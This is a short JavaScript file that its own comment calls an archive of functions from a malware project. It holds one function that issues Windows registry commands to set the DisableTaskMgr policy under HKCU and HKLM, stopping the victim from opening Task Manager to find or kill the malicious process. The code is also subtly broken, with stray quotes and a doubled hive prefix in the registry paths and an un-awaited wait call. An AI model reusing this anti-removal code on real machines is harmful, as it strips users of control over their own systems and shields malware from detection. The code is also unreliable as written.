/* archive.js contains useful functional programs that are not used in the malware
   but still potentially useful */

async function disableTaskMgr() { // Requires a REBOOT to take effect

    const taskMgrKey = Win.path`'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\'`;

    try {
        Win.cmd(`REG QUERY ${taskMgrKey} /v DisableTaskMgr`);
        wait(250);
        Win.cmd(`REG ADD HKCU ${taskMgrKey} /v DisableTaskMgr /t REG_DWORD /d 1 /f`);
    } catch {
        Win.cmd(`REG ADD HKCU' ${taskMgrKey} '/v DisableTaskMgr /t REG_DWORD /d 1 /f`);
        wait(250);
        Win.cmd(`REG ADD HKLM' ${taskMgrKey} '/v DisableTaskMgr /t REG_DWORD /d 1 /f`);
    }
}